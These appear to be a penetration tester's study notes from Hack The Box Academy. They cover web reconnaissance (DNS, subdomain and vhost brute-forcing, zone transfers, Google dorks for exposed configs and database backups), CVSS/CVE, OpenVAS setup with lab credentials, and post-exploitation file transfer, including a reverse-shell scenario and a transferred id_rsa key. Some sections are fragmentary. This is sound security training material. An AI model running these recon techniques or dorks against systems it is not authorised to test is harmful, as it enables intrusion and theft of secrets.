|`A`|Address Record|Maps a hostname to its IPv4 address.|`www.example.com.` IN A `192.0.2.1`|
|`AAAA`|IPv6 Address Record|Maps a hostname to its IPv6 address.|`www.example.com.` IN AAAA `2001:db8:85a3::8a2e:370:7334`|
|`CNAME`|Canonical Name Record|Creates an alias for a hostname, pointing it to another hostname.|`blog.example.com.` IN CNAME `webserver.example.net.`|
|`MX`|Mail Exchange Record|Specifies the mail server(s) responsible for handling email for the domain.|`example.com.` IN MX 10 `mail.example.com.`|
|`NS`|Name Server Record|Delegates a DNS zone to a specific authoritative name server.|`example.com.` IN NS `ns1.example.com.`|
|`TXT`|Text Record|Stores arbitrary text information, often used for domain verification or security policies.|`example.com.` IN TXT `"v=spf1 mx -all"` (SPF record)|
|`SOA`|Start of Authority Record|Specifies administrative information about a DNS zone, including the primary name server, responsible person's email, and other parameters.|`example.com.` IN SOA `ns1.example.com. admin.example.com. 2024060301 10800 3600 604800 86400`|
|`SRV`|Service Record|Defines the hostname and port number for specific services.|`_sip._udp.example.com.` IN SRV 10 5 5060 `sipserver.example.com.`|
|`PTR`|Pointer Record|Used for reverse DNS lookups, mapping an IP address to a hostname.|`1.2.0.192.in-addr.arpa.` IN PTR `www.example.com.`|

The "`IN`" in the examples stands for "Internet." It's a class field in DNS records that specifies the protocol family. In most cases, you'll see "`IN`" used, as it denotes the Internet protocol suite (IP) used for most domain names. Other class values exist (e.g., `CH` for Chaosnet, `HS` for Hesiod) but are rarely used in modern DNS configurations.

In essence, "`IN`" is simply a convention that indicates that the record applies to the standard internet protocols we use today. While it might seem like an extra detail, understanding its meaning provides a deeper understanding of DNS record structure.

## Why DNS Matters for Web Recon

DNS is not merely a technical protocol for translating domain names; it's a critical component of a target's infrastructure that can be leveraged to uncover vulnerabilities and gain access during a penetration test:

- `Uncovering Assets`: DNS records can reveal a wealth of information, including subdomains, mail servers, and name server records. For instance, a `CNAME` record pointing to an outdated server (`dev.example.com` CNAME `oldserver.example.net`) could lead to a vulnerable system.
- `Mapping the Network Infrastructure`: You can create a comprehensive map of the target's network infrastructure by analysing DNS data. For example, identifying the name servers (`NS` records) for a domain can reveal the hosting provider used, while an `A` record for `loadbalancer.example.com` can pinpoint a load balancer. This helps you understand how different systems are connected, identify traffic flow, and pinpoint potential choke points or weaknesses that could be exploited during a penetration test.
- `Monitoring for Changes`: Continuously monitoring DNS records can reveal changes in the target's infrastructure over time. For example, the sudden appearance of a new subdomain (`vpn.example.com`) might indicate a new entry point into the network, while a `TXT` record containing a value like `_1password=...` strongly suggests the organization is using 1Password, which could be leveraged for social engineering attacks or targeted phishing campaigns.



## The Domain Information Groper

The `dig` command (`Domain Information Groper`) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records. Its flexibility and detailed and customizable output make it a go-to choice.

### Common dig Commands

# Subdomain Bruteforcing

---

`Subdomain Brute-Force Enumeration` is a powerful active subdomain discovery technique that leverages pre-defined lists of potential subdomain names. This approach systematically tests these names against the target domain to identify valid subdomains. By using carefully crafted wordlists, you can significantly increase the efficiency and effectiveness of your subdomain discovery efforts.

The process breaks down into four steps:

1. `Wordlist Selection`: The process begins with selecting a wordlist containing potential subdomain names. These wordlists can be:
    - `General-Purpose`: Containing a broad range of common subdomain names (e.g., `dev`, `staging`, `blog`, `mail`, `admin`, `test`). This approach is useful when you don't know the target's naming conventions.
    - `Targeted`: Focused on specific industries, technologies, or naming patterns relevant to the target. This approach is more efficient and reduces the chances of false positives.
    - `Custom`: You can create your own wordlist based on specific keywords, patterns, or intelligence gathered from other sources.
2. `Iteration and Querying`: A script or tool iterates through the wordlist, appending each word or phrase to the main domain (e.g., `example.com`) to create potential subdomain names (e.g., `dev.example.com`, `staging.example.com`).
3. `DNS Lookup`: A DNS query is performed for each potential subdomain to check if it resolves to an IP address. This is typically done using the A or AAAA record type.
4. `Filtering and Validation`: If a subdomain resolves successfully, it's added to a list of valid subdomains. Further validation steps might be taken to confirm the subdomain's existence and functionality (e.g., by attempting to access it through a web browser).Code: bash

```bash
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
```


```bash
c0derpwner@htb[/htb]$ dnsenum --enum inlanefreight.com -f  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# DNS Zone Transfers

---

While brute-forcing can be a fruitful approach, there's a less invasive and potentially more efficient method for uncovering subdomains – DNS zone transfers. This mechanism, designed for replicating DNS records between name servers, can inadvertently become a goldmine of information for prying eyes if misconfigured.

## What is a Zone Transfer

A DNS zone transfer is essentially a wholesale copy of all DNS records within a zone (a domain and its subdomains) from one name server to another. This process is essential for maintaining consistency and redundancy across DNS servers. However, if not adequately secured, unauthorised parties can download the entire zone file, revealing a complete list of subdomains, their associated IP addresses, and other sensitive DNS data.![[dns_axfr.png]]

1. `Zone Transfer Request (AXFR)`: The secondary DNS server initiates the process by sending a zone transfer request to the primary server. This request typically uses the AXFR (Full Zone Transfer) type.
2. `SOA Record Transfer`: Upon receiving the request (and potentially authenticating the secondary server), the primary server responds by sending its Start of Authority (SOA) record. The SOA record contains vital information about the zone, including its serial number, which helps the secondary server determine if its zone data is current.
3. `DNS Records Transmission`: The primary server then transfers all the DNS records in the zone to the secondary server, one by one. This includes records like A, AAAA, MX, CNAME, NS, and others that define the domain's subdomains, mail servers, name servers, and other configurations.
4. `Zone Transfer Complete`: Once all records have been transmitted, the primary server signals the end of the zone transfer. This notification informs the secondary server that it has received a complete copy of the zone data.
5. `Acknowledgement (ACK)`: The secondary server sends an acknowledgement message to the primary server, confirming the successful receipt and processing of the zone data. This completes the zone transfer process.


The information gleaned from an unauthorised zone transfer can be invaluable to an attacker. It reveals a comprehensive map of the target's DNS infrastructure, including:

- `Subdomains`: A complete list of subdomains, many of which might not be linked from the main website or easily discoverable through other means. These hidden subdomains could host development servers, staging environments, administrative panels, or other sensitive resources.
- `IP Addresses`: The IP addresses associated with each subdomain, providing potential targets for further reconnaissance or attacks.
- `Name Server Records`: Details about the authoritative name servers for the domain, revealing the hosting provider and potential misconfigurations.


#### Exploiting Zone Transfers

You can use the `dig` command to request a zone transfer:

# Virtual Hosts

---

Once the DNS directs traffic to the correct server, the web server configuration becomes crucial in determining how the incoming requests are handled. Web servers like Apache, Nginx, or IIS are designed to host multiple websites or applications on a single server. They achieve this through virtual hosting, which allows them to differentiate between domains, subdomains, or even separate websites with distinct content.


## Understanding VHosts and Subdomains

At the core of `virtual hosting` is the ability of web servers to distinguish between multiple websites or applications sharing the same IP address. This is achieved by leveraging the **`HTTP Host` header**, a piece of information included in every `HTTP` request sent by a web browser.


The key difference between `VHosts` and `subdomains` is their relationship to the `Domain Name System (DNS)` and the web server's configuration.

- **`Subdomains`**: These are extensions of a main domain name (e.g., `blog.example.com` is a subdomain of `example.com`). `Subdomains` typically have their own `DNS records`, pointing to either the same IP address as the main domain or a different one. They can be used to organise different sections or services of a website.
- **`Virtual Hosts` (`VHosts`)**: Virtual hosts are configurations within a web server that allow multiple websites or applications to be hosted on a single server. They can be associated with top-level domains (e.g., `example.com`) or subdomains (e.g., `dev.example.com`). Each virtual host can have its own separate configuration, enabling precise control over how requests are handled.


example apache.conf

```
apacheconf
# Example of name-based virtual host configuration in Apache
<VirtualHost *:80>
    ServerName www.example1.com
    DocumentRoot /var/www/example1
</VirtualHost>

<VirtualHost *:80>
    ServerName www.example2.org
    DocumentRoot /var/www/example2
</VirtualHost>

<VirtualHost *:80>
    ServerName www.another-example.net
    DocumentRoot /var/www/another-example
</VirtualHost>

```

### Server VHost Lookup

The following illustrates the process of how a web server determines the correct content to serve based on the `Host` header:

![](https://mermaid.ink/svg/pako:eNqNUsFuwjAM_ZUop00CPqAHDhubuCBNBW2XXrzUtNFap3McOoT496WUVUA3aTkltp_f84sP2rgcdaI9fgYkgwsLBUOdkYqnARZrbAMk6oFd65HHiTd8XyPvfku9WpYA1dJ5eXS0tcW4ZOFMqJEkdU4y6vNnqul8PvRO1HKzeVFpp9KLumvbdmapAsItoy1KmRlX3_fwAXTd4OkLakuoOjVqiZAj_7_PaJJEPVvK1QrElJYK1UcDg1h3HmOEmV4LSlEC0-CA6i24Zb406IRhizuM7BV6BVFCit4FNuh77GX9DeGfmEu-s_mD4b5x5PH2Y4aqhfVNBftufomsGemJrpFrsHncqkOHy7SUWGOmk3jNgT8yndEx1kEQt96T0YlwwIlmF4pSJ1uofHyFJgf52cchirkVx6t-aU-7e_wG--_4bQ)

1. `Browser Requests a Website`: When you enter a domain name (e.g., `www.inlanefreight.com`) into your browser, it initiates an HTTP request to the web server associated with that domain's IP address.
2. `Host Header Reveals the Domain`: The browser includes the domain name in the request's `Host` header, which acts as a label to inform the web server which website is being requested.
3. `Web Server Determines the Virtual Host`: The web server receives the request, examines the `Host` header, and consults its virtual host configuration to find a matching entry for the requested domain name.
4. `Serving the Right Content`: Upon identifying the correct virtual host configuration, the web server retrieves the corresponding files and resources associated with that website from its document root and sends them back to the browser as the HTTP response.

In essence, the `Host` header functions as a switch, enabling the web server to dynamically determine which website to serve based on the domain name requested by the browser.



## Virtual Host Discovery Tools

While manual analysis of `HTTP headers` and reverse `DNS lookups` can be effective, specialised `virtual host discovery tools` automate and streamline the process, making it more efficient and comprehensive. These tools employ various techniques to probe the target server and uncover potential `virtual hosts`.

Several tools are available to aid in the discovery of virtual hosts:

| Tool                                                 | Description                                                                                                      | Features                                                        |
| ---------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------- |
| [gobuster](https://github.com/OJ/gobuster)           | A multi-purpose tool often used for directory/file brute-forcing, but also effective for virtual host discovery. | Fast, supports multiple HTTP methods, can use custom wordlists. |
| [Feroxbuster](https://github.com/epi052/feroxbuster) | Similar to Gobuster, but with a Rust-based implementation, known for its speed and flexibility.                  | Supports recursion, wildcard discovery, and various filters.    |
| [ffuf](https://github.com/ffuf/ffuf)                 | Another fast web fuzzer that can be used for virtual host discovery by fuzzing the `Host` header.                | Customizable wordlist input and filtering options.              |


The `gobuster` command to bruteforce vhosts generally looks like this:

Virtual Hosts

```bash
c0derpwner@htb[/htb]$ gobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain
```

- The `-u` flag specifies the target URL (replace `<target_IP_address>` with the actual IP).
- The `-w` flag specifies the wordlist file (replace `<wordlist_file>` with the path to your wordlist).
- The `--append-domain` flag appends the base domain to each word in the wordlist.
  
  
  In newer versions of Gobuster, the --append-domain flag is required to append the base domain to each word in the wordlist when performing virtual host discovery.

# Certificate Transparency Logs

---

In the sprawling mass of the internet, trust is a fragile commodity. One of the cornerstones of this trust is the `Secure Sockets Layer/Transport Layer Security` (`SSL/TLS`) protocol, which encrypts communication between your browser and a website. At the heart of SSL/TLS lies the `digital certificate`, a small file that verifies a website's identity and allows for secure, encrypted communication.

However, the process of issuing and managing these certificates isn't foolproof. Attackers can exploit rogue or mis-issued certificates to impersonate legitimate websites, intercept sensitive data, or spread malware. This is where Certificate Transparency (CT) logs come into play.




Certificate Transparency (CT) logs are public, append-only ledgers that record the issuance of SSL/TLS certificates. Whenever a Certificate Authority (CA) issues a new certificate, it must submit it to multiple CT logs. Independent organisations maintain these logs and are open for anyone to inspect.

Think of CT logs as a global registry of certificates. They provide a transparent and verifiable record of every SSL/TLS certificate issued for a website. This transparency serves several crucial purposes:

### Crt.sh lookup

While `crt.sh` offers a convenient web interface, you can also leverage its API for automated searches directly from your terminal. Let's see how to find all 'dev' subdomains on `facebook.com` using `curl` and `jq`:

```bash
└─$ curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u  
*.dev.facebook.com  
*.newdev.facebook.com  
*.secure.dev.facebook.com  
dev.facebook.com  
devvm1958.ftw3.facebook.com  
facebook-amex-dev.facebook.com  
facebook-amex-sign-enc-dev.facebook.com  
newdev.facebook.com  
secure.dev.facebook.com
```

## Fingerprinting Techniques

There are several techniques used for web server and technology fingerprinting:

- `Banner Grabbing`: Banner grabbing involves analysing the banners presented by web servers and other services. These banners often reveal the server software, version numbers, and other details.
- `Analysing HTTP Headers`: HTTP headers transmitted with every web page request and response contain a wealth of information. The `Server` header typically discloses the web server software, while the `X-Powered-By` header might reveal additional technologies like scripting languages or frameworks.
- `Probing for Specific Responses`: Sending specially crafted requests to the target can elicit unique responses that reveal specific technologies or versions. For example, certain error messages or behaviours are characteristic of particular web servers or software components.
- `Analysing Page Content`: A web page's content, including its structure, scripts, and other elements, can often provide clues about the underlying technologies. There may be a copyright header that indicates specific software being used, for example.

A variety of tools exist that automate the fingerprinting process, combining various techniques to identify web servers, operating systems, content management systems, and other technologies:

| Tool         | Description                                                                                                           | Features                                                                                            |
| ------------ | --------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| `Wappalyzer` | Browser extension and online service for website technology profiling.                                                | Identifies a wide range of web technologies, including CMSs, frameworks, analytics tools, and more. |
| `BuiltWith`  | Web technology profiler that provides detailed reports on a website's technology stack.                               | Offers both free and paid plans with varying levels of detail.                                      |
| `WhatWeb`    | Command-line tool for website fingerprinting.                                                                         | Uses a vast database of signatures to identify various web technologies.                            |
| `Nmap`       | Versatile network scanner that can be used for various reconnaissance tasks, including service and OS fingerprinting. | Can be used with scripts (NSE) to perform more specialised fingerprinting.                          |
| `Netcraft`   | Offers a range of web security services, including website fingerprinting and security reporting.                     | Provides detailed reports on a website's technology, hosting provider, and security posture.        |
| `wafw00f`    | Command-line tool specifically designed for identifying Web Application Firewalls (WAFs).                             | Helps determine if a WAF is present and, if so, its type and configuration.                         |
### Banner Grabbing

Our first step is to gather information directly from the web server itself. We can do this using the `curl` command with the `-I` flag (or `--head`) to fetch only the HTTP headers, not the entire page content.

Fingerprinting

```bash
c0derpwner@htb[/htb]$ curl -I inlanefreight.com


HTTP/1.1 301 Moved Permanently
Date: Fri, 31 May 2024 12:07:44 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: https://inlanefreight.com/
Content-Type: text/html; charset=iso-8859-1
```


### Wafw00f

`Web Application Firewalls` (`WAFs`) are security solutions designed to protect web applications from various attacks. Before proceeding with further fingerprinting, it's crucial to determine if `inlanefreight.com` employs a WAF, as it could interfere with our probes or potentially block our requests.

To detect the presence of a WAF, we'll use the `wafw00f` tool. To install `wafw00f`, you can use pip3:

```bash
c0derpwner@htb[/htb]$ pip3 install git+https://github.com/EnableSecurity/wafw00f
```



# Crawling

`Crawling`, often called `spidering`, is the `automated process of systematically browsing the World Wide Web`. Similar to how a spider navigates its web, a web crawler follows links from one page to another, collecting information. These crawlers are essentially bots that use pre-defined algorithms to discover and index web pages, making them accessible through search engines or for other purposes like data analysis and web reconnaissance.

## How Web Crawlers Work

The basic operation of a web crawler is straightforward yet powerful. It starts with a seed URL, which is the initial web page to crawl. The crawler fetches this page, parses its content, and extracts all its links. It then adds these links to a queue and crawls them, repeating the process iteratively. Depending on its scope and configuration, the crawler can explore an entire website or even a vast portion of the web.

1. `Homepage`: You start with the homepage containing `link1`, `link2`, and `link3`.


---

# robots.txt


Imagine you're a guest at a grand house party. While you're free to mingle and explore, there might be certain rooms marked "Private" that you're expected to avoid. This is akin to how `robots.txt` functions in the world of web crawling. It acts as a virtual "`etiquette guide`" for bots, outlining which areas of a website they are allowed to access and which are off-limits.


```bash

User-agent: *
Disallow: /private/

```


```bash
User-agent: *
Disallow: /admin/
Disallow: /private/
Allow: /public/

User-agent: Googlebot
Crawl-delay: 10

Sitemap: https://www.example.com/sitemap.xml
```

This file contains the following directives:

- All user agents are disallowed from accessing the `/admin/` and `/private/` directories.
- All user agents are allowed to access the `/public/` directory.
- The `Googlebot` (Google's web crawler) is specifically instructed to wait 10 seconds between requests.
- The sitemap, located at `https://www.example.com/sitemap.xml`, is provided for easier crawling and indexing.

By analyzing this robots.txt, we can infer that the website likely has an admin panel located at `/admin/` and some private content in the `/private/` directory.

# Well-Known URIs



The `.well-known` standard, defined in [RFC 8615](https://datatracker.ietf.org/doc/html/rfc8615), serves as a standardized directory within a website's root domain. This designated location, typically accessible via the `/.well-known/` path on a web server, centralizes a website's critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.

By establishing a consistent location for such data, `.well-known` simplifies the discovery and access process for various stakeholders, including web browsers, applications, and security tools. This streamlined approach enables clients to automatically locate and retrieve specific configuration files by constructing the appropriate URL. For instance, to access a website's security policy, a client would request `https://example.com/.well-known/security.txt`.

The `Internet Assigned Numbers Authority` (`IANA`) maintains a [registry](https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml) of `.well-known` URIs, each serving a specific purpose defined by various specifications and standards. Below is a table highlighting a few notable examples:


| URI Suffix                     | Description                                                                                           | Status      | Reference |
| ------------------------------ | ----------------------------------------------------------------------------------------------------- | ----------- | --------- |
| `security.txt`                 | Contains contact information for security researchers to report vulnerabilities.                      | Permanent   | RFC 9116  |
| `/.well-known/change-password` | Provides a standard URL for directing users to a password change page.                                | Provisional |           |
| `openid-configuration`         | Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol. | Permanent   |           |
| `assetlinks.json`              | Used for verifying ownership of digital assets (e.g., apps) associated with a domain.                 | Permanent   |           |
| `mta-sts.txt`                  | Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.      | Permanent   | RFC 8461  |

# Creepy Crawlies



Web crawling is vast and intricate, but you don't have to embark on this journey alone. A plethora of web crawling tools are available to assist you, each with its own strengths and specialties. These tools automate the crawling process, making it faster and more efficient, allowing you to focus on analyzing the extracted data.

## Popular Web Crawlers

1. `Burp Suite Spider`: Burp Suite, a widely used web application testing platform, includes a powerful active crawler called Spider. 
2. `OWASP ZAP (Zed Attack Proxy)`: ZAP is a free, open-source web application security scanner. It can be used in automated and manual modes and includes a spider component to crawl web applications and identify potential vulnerabilities.
3. `Scrapy (Python Framework)`: Scrapy is a versatile and scalable Python framework for building custom web crawlers.
4. `Apache Nutch (Scalable Crawler)`: Nutch is a highly extensible and scalable open-source web crawler written in Java. It's designed to handle massive crawls across the entire web or focus on specific domains. 

Adhering to ethical and responsible crawling practices is crucial no matter which tool you choose. Always obtain permission before crawling a website, especially if you plan to perform extensive or intrusive scans. Be mindful of the website's server resources and avoid overloading them with excessive requests.

# Search Engine Discovery



Search engines serve as our guides in the vast landscape of the internet, helping us navigate through the seemingly endless expanse of information. However, beyond their primary function of answering everyday queries, search engines also hold a treasure trove of data that can be invaluable for web reconnaissance and information gathering. This practice, known as search engine discovery or OSINT (Open Source Intelligence) gathering, involves using search engines as powerful tools to uncover information about target websites, organisations, and individuals.


## Search Operators

Search operators are like search engines' secret codes. These special commands and modifiers unlock a new level of precision and control, allowing you to pinpoint specific types of information amidst the vastness of the indexed web.

While the exact syntax may vary slightly between search engines, the underlying principles remain consistent. Let's delve into some essential and advanced search operators:

|Operator|Operator Description|Example|Example Description|
|:--|:--|:--|:--|
|`site:`|Limits results to a specific website or domain.|`site:example.com`|Find all publicly accessible pages on example.com.|

### Google Dorking

Google Dorking, also known as Google Hacking, is a technique that leverages the power of search operators to uncover sensitive information, security vulnerabilities, or hidden content on websites, using Google Search.

Here are some common examples of Google Dorks, for more examples, refer to the [Google Hacking Database](https://www.exploit-db.com/google-hacking-database):

- Finding Login Pages:
    - `site:example.com inurl:login`
    - `site:example.com (inurl:login OR inurl:admin)`
- Identifying Exposed Files:
    - `site:example.com filetype:pdf`
    - `site:example.com (filetype:xls OR filetype:docx)`
- Uncovering Configuration Files:
    - `site:example.com inurl:config.php`
    - `site:example.com (ext:conf OR ext:cnf)` (searches for extensions commonly used for configuration files)
- Locating Database Backups:
    - `site:example.com inurl:backup`
    - `site:example.com filetype:sql`




# Web Archives

# Common Vulnerability Scoring System (CVSS)



There are various ways to score or calculate severity ratings of vulnerabilities. The [Common Vulnerability Scoring System (CVSS)](https://www.first.org/cvss/) is an industry standard for performing these calculations. Many scanning tools will apply these scores to each finding as a part of the scan results, but it's important that we understand how these scores are derived in case we ever need to calculate one by hand or justify the score applied to a given vulnerability. The CVSS is often used together with the so-called [Microsoft DREAD](https://en.wikipedia.org/wiki/DREAD_\(risk_assessment_model\)). `DREAD` is a risk assessment system developed by Microsoft to help IT security professionals evaluate the severity of security threats and vulnerabilities. It is used to perform a risk analysis by using a scale of 10 points to assess the severity of security threats and vulnerabilities. With this, we calculate the risk of a threat or vulnerability based on five main factors:

- Damage Potential
- Reproducibility
- Exploitability
- Affected Users
- Discoverability

The model is essential to Microsoft's security strategy and is used to monitor, assess and respond to security threats and vulnerabilities in Microsoft products. It also serves as a reference for IT security professionals and managers to perform their risk assessment and prioritization of security threats and vulnerabilities.


## Calculating CVSS Severity

The calculation of a CVSS v3.1 score takes into account all the metrics discussed in this section. The National Vulnerability Database has a calculator available to the public [here](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator).


# Common Vulnerabilities and Exposures (CVE)



## Open Vulnerability Assessment Language (OVAL)

[Open Vulnerability Assessment Language (OVAL)](https://oval.mitre.org/) is a publicly available information security international standard used to evaluate and detail the system's current state and issues. OVAL is also co-supported by the office of Cybersecurity and Communications from the U.S. Department of Homeland Security. OVAL provides a language to understand encoding system attributes and various content repositories shared within the security community. The OVAL repository has over 7000+ definitions for public use. Additionally, OVAL is also used by the U.S. National Institute of Standards and Technology's (NIST) Security Content Automation Protocol (SCAP) which brings together community ideas for automating vulnerability management, measurement, and ensuring systems meet policy compliance.

# CVE
[Common Vulnerabilities and Exposures (CVE)](https://cve.mitre.org/) is a publicly available catalog of security issues sponsored by the United States Department of Homeland Security (DHS). Each security issue has a unique CVE ID number assigned by the CVE Numbering Authority (CNA). The purpose of creating a unique CVE ID number is to create a standardization for a vulnerability or exposure as a researcher identifies it. A CVE consists of critical information regarding a vulnerability or exposure, including a description and references about the issue. The information in a CVE allows an organization's IT team to understand how detrimental a problem could be to their environment.

The following chart explains how a CVE ID may be assigned to a vulnerability. Any vulnerabilities assigned a CVE must be independently fixable, affect just one codebase, and be acknowledged and documented by the relevant vendor.

#### Stage 1: Identify if CVE is Required and Relevant

Identify if the issue found is a vulnerability. According to the CVE Team, "A vulnerability in the context of the CVE Program is indicated by code that can be exploited, resulting in a negative impact to confidentiality, integrity, OR availability, and that requires a coding change, specification change, or specification deprecation to mitigate or address." Additionally, research should verify there is not a CVE ID already in the CVE database.

#### Stage 2: Reach Out to Affected Product Vendor

A researcher should ensure they have made a good faith effort to contact a vendor directly. Researchers can reference CVE's [Documents on Disclosure Practices](https://cve.mitre.org/cve/researcher_reservation_guidelines#appendix#a) for additional information.

#### Stage 3: Identify if Request Should Be For Vendor CNA or Third Party CNA

If a company is a part of participating CNA's, they can assign a CVE ID for one of their products. If the issue is for a participating CNA, researchers can contact the appropriate CNA organization [here](https://cve.mitre.org/cve/request_id.html). If the vendor is not a participating CNA, a researcher should attempt to reach out to the vendor's third-party coordinator.

#### Stage 4: Requesting CVE ID Through CVE Web Form

The CVE Team has a form that can be filled out online [here](https://cveform.mitre.org/) if the methods above do not work for CVE requests.

#### Stage 5: Confirmation of CVE Form

Upon submitting the CVE Web Form mentioned in Stage 4, an individual will receive a confirmation email. The CVE team will contact the requestor if any additional information is required.

#### Stage 6: Receival of CVE ID

Upon approval, the CVE Team will notify the requestor of a CVE ID if the affected product's vulnerability is confirmed. Please note that the CVE ID is not public yet at this stage.

#### Stage 7: Public Disclosure of CVE ID

CVE IDs can be announced to the public as soon as appropriate vendors and parties are aware of the issue to prevent duplication of CVE IDs. This stage ensures that all associated parties are aware of the problem before being publicly disclosed.

#### Stage 8: Announcing the CVE

The CVE Team asks researchers who are sharing multiple CVEs to ensure each CVE indicates the different vulnerabilities. Additional information can be found [here](https://cve.mitre.org/cve/researcher_reservation_guidelines).

#### Stage 9: Providing Information to The CVE Team

At this stage, the CVE Team asks that the researcher help provide additional information to be used in the official CVE listing on the website. The [U.S. National Vulnerability Database (NVD)](https://nvd.nist.gov/) maintains this information online in their database as well.

# Getting Started with OpenVAS



[OpenVAS](https://openvas.org/), by Greenbone Networks, is a publicly available vulnerability scanner. Greenbone Networks has an entire Vulnerability Manager, part of which is the OpenVAS scanner. Greenbone's Vulnerability Manager is also open to the public and free to use. OpenVAS has the capabilities to perform network scans, including authenticated and unauthenticated testing.![[opena_vas.png]]


## Installing Package

First, we can start by installing the tool:

Getting Started with OpenVAS

```bash
c0derpwner@htb[/htb]$ sudo apt-get update && apt-get -y full-upgrade
c0derpwner@htb[/htb]$ sudo apt-get install gvm && openvas

c0derpwner@htb[/htb]$ gvm-setup
```

then 

```bash
c0derpwner@htb[/htb]$ gvm-start
```

**Note:** The VM provided in the `OpenVAS Skills Assessment` section has OpenVAS pre-installed and the targets running. You can go to that section and start the VM and use OpenVAS throughout the module, which can be accessed at `https://< IP >:8080`. The OpenVAS credentials are: `htb-student`:`HTB_@cademy_student!`. You may also use these credentials to SSH into the target VM to configure OpenVAS.

The OpenVAS Greenbone Security Assistant application has various tabs that you can interact with. For this section, we will be digging into the scans. If you navigate to the `Scans` tab shown below, you will see the scans that have run in the past. You will also be able to see how to create a new task to run a scan. The tasks work off of the scanning configurations that the user sets up.

**Note:** The scans shown in this section have already been pre-run to save you the time of waiting for them to finish. If you re-run the scan, it's best to go through vulnerabilities as they come, instead of waiting for the scan to finish, as they can take 1-2 hours to finish.


**Note:** To run a credentialed scan on the target, use the following credentials: 
`htb-student_adm`:`HTB_@cademy_student!` for Linux 
`administrator`:`Academy_VA_adm1!` for Windows. 
These scans have already been set up in the OpenVAS target to save you time.

**Note:** For this module, the Windows target will be `172.16.16.100` and the Linux target will be `172.16.16.160`.

# File Transfers
#file-transfer #scp 


There are many situations when transferring files to or from a target system is necessary. Let's imagine the following scenario:

**Setting the Stage**

During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transfer [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the [Application Control Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control). We perform our local enumeration manually and find that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege). We need to transfer a binary to our target machine to escalate privileges using the [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) tool. We then try to use [Certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use the [Impacket smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user.

# Windows File Transfer Methods



## Introduction

The Windows operating system h---as evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. Let's use the [Microsoft Astaroth Attack](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) blog post as an example of an advanced persistent threat (APT).

The blog post starts out talking about [fileless threats](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/). The term `fileless` suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the system but runs in memory.

The `Astaroth attack` generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).

All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the `Userinit` process. Below is a graphical depiction of the attack.

![Flowchart of a spear-phishing attack using WMIC, Bitsadmin, Certutil, and Regsvr32 to execute and inject malicious DLLs.](https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png)

[Image source](https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png)

This is an excellent example of multiple methods for file transfer and the threat actor using those methods to bypass defenses.

This section will discuss using some native Windows tools for download and upload operations. Later in the module, we'll discuss `Living Off The Land` binaries on Windows & Linux and how to use them to perform file transfer operations.

```

We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.

Windows File Transfer Methods

```

Finally, we can confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5sum` does.

#### Confirming the MD5 Hashes Match

Windows File Transfer Methods

```powershell
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

